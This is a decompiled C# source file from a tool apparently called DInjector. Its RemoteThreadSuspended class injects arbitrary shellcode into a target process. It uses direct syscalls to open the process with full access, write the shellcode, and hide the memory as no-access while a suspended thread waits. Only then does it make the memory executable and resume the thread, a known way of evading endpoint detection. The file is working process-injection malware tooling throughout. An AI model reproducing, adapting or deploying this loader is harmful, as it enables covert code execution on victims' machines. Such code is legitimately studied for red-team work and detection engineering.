using System;
using System.Runtime.InteropServices;
using System.Threading;
using DInvoke.Data;
using DInvoke.DynamicInvoke;

namespace DInjector
{
	// Token: 0x02000010 RID: 16
	internal class RemoteThreadSuspended
	{
		// Token: 0x06000033 RID: 51 RVA: 0x00004240 File Offset: 0x00002440
		public static void Execute(byte[] shellcodeBytes, int processID)
		{
			RemoteThreadSuspended.NtOpenProcess ntOpenProcess = (RemoteThreadSuspended.NtOpenProcess)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtOpenProcess"), typeof(RemoteThreadSuspended.NtOpenProcess));
			IntPtr zero = IntPtr.Zero;
			RemoteThreadSuspended.OBJECT_ATTRIBUTES object_ATTRIBUTES = default(RemoteThreadSuspended.OBJECT_ATTRIBUTES);
			RemoteThreadSuspended.CLIENT_ID client_ID = new RemoteThreadSuspended.CLIENT_ID
			{
				UniqueProcess = (IntPtr)processID
			};
			DInvoke.Data.Native.NTSTATUS ntstatus = ntOpenProcess(ref zero, Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS, ref object_ATTRIBUTES, ref client_ID);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadSuspended) [+] NtOpenProcess");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThreadSuspended) [-] NtOpenProcess: {0}", ntstatus));
			}
			RemoteThreadSuspended.NtAllocateVirtualMemory ntAllocateVirtualMemory = (RemoteThreadSuspended.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtAllocateVirtualMemory"), typeof(RemoteThreadSuspended.NtAllocateVirtualMemory));
			IntPtr zero2 = IntPtr.Zero;
			IntPtr intPtr = (IntPtr)shellcodeBytes.Length;
			ntstatus = ntAllocateVirtualMemory(zero, ref zero2, IntPtr.Zero, ref intPtr, Win32.Kernel32.MEM_COMMIT | Win32.Kernel32.MEM_RESERVE, 4U);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadSuspended) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThreadSuspended) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {0}", ntstatus));
			}
			RemoteThreadSuspended.NtWriteVirtualMemory ntWriteVirtualMemory = (RemoteThreadSuspended.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtWriteVirtualMemory"), typeof(RemoteThreadSuspended.NtWriteVirtualMemory));
			IntPtr intPtr2 = Marshal.AllocHGlobal(shellcodeBytes.Length);
			Marshal.Copy(shellcodeBytes, 0, intPtr2, shellcodeBytes.Length);
			uint num = 0U;
			ntstatus = ntWriteVirtualMemory(zero, zero2, intPtr2, (uint)shellcodeBytes.Length, ref num);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadSuspended) [+] NtWriteVirtualMemory");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThreadSuspended) [-] NtWriteVirtualMemory: {0}", ntstatus));
			}
			Marshal.FreeHGlobal(intPtr2);
			uint num2;
			ntstatus = ((RemoteThreadSuspended.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtProtectVirtualMemory"), typeof(RemoteThreadSuspended.NtProtectVirtualMemory)))(zero, ref zero2, ref intPtr, 1U, out num2);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadSuspended) [+] NtProtectVirtualMemory, PAGE_NOACCESS");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThreadSuspended) [-] NtProtectVirtualMemory, PAGE_NOACCESS: {0}", ntstatus));
			}
			RemoteThreadSuspended.NtCreateThreadEx ntCreateThreadEx = (RemoteThreadSuspended.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtCreateThreadEx"), typeof(RemoteThreadSuspended.NtCreateThreadEx));
			IntPtr zero3 = IntPtr.Zero;
			ntstatus = ntCreateThreadEx(out zero3, Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, zero, zero2, IntPtr.Zero, true, 0, 0, 0, IntPtr.Zero);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadSuspended) [+] NtCreateThreadEx, CREATE_SUSPENDED");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThreadSuspended) [-] NtCreateThreadEx, CREATE_SUSPENDED: {0}", ntstatus));
			}
			Thread.Sleep(10000);
			ntstatus = ((RemoteThreadSuspended.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtProtectVirtualMemory"), typeof(RemoteThreadSuspended.NtProtectVirtualMemory)))(zero, ref zero2, ref intPtr, 32U, out num2);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadSuspended) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThreadSuspended) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {0}", ntstatus));
			}
			RemoteThreadSuspended.NtResumeThread ntResumeThread = (RemoteThreadSuspended.NtResumeThread)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtResumeThread"), typeof(RemoteThreadSuspended.NtResumeThread));
			uint num3 = 0U;
			ntstatus = ntResumeThread(zero3, ref num3);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThreadSuspended) [+] NtResumeThread");
				return;
			}
			Console.WriteLine(string.Format("(RemoteThreadSuspended) [-] NtResumeThread: {0}", ntstatus));
		}

		// Token: 0x0200004E RID: 78
		// (Invoke) Token: 0x060000C2 RID: 194
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtOpenProcess(ref IntPtr ProcessHandle, Win32.Kernel32.ProcessAccessFlags DesiredAccess, ref RemoteThreadSuspended.OBJECT_ATTRIBUTES ObjectAttributes, ref RemoteThreadSuspended.CLIENT_ID ClientId);

		// Token: 0x0200004F RID: 79
		// (Invoke) Token: 0x060000C6 RID: 198
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

		// Token: 0x02000050 RID: 80
		// (Invoke) Token: 0x060000CA RID: 202
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, uint BufferLength, ref uint BytesWritten);

		// Token: 0x02000051 RID: 81
		// (Invoke) Token: 0x060000CE RID: 206
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

		// Token: 0x02000052 RID: 82
		// (Invoke) Token: 0x060000D2 RID: 210
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtCreateThreadEx(out IntPtr threadHandle, Win32.WinNT.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList);

		// Token: 0x02000053 RID: 83
		// (Invoke) Token: 0x060000D6 RID: 214
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtResumeThread(IntPtr ThreadHandle, ref uint SuspendCount);

		// Token: 0x02000054 RID: 84
		private struct OBJECT_ATTRIBUTES
		{
			// Token: 0x0400027D RID: 637
			public int Length;

			// Token: 0x0400027E RID: 638
			public IntPtr RootDirectory;

			// Token: 0x0400027F RID: 639
			public IntPtr ObjectName;

			// Token: 0x04000280 RID: 640
			public uint Attributes;

			// Token: 0x04000281 RID: 641
			public IntPtr SecurityDescriptor;

			// Token: 0x04000282 RID: 642
			public IntPtr SecurityQualityOfService;
		}

		// Token: 0x02000055 RID: 85
		private struct CLIENT_ID
		{
			// Token: 0x04000283 RID: 643
			public IntPtr UniqueProcess;

			// Token: 0x04000284 RID: 644
			public IntPtr UniqueThread;
		}
	}
}
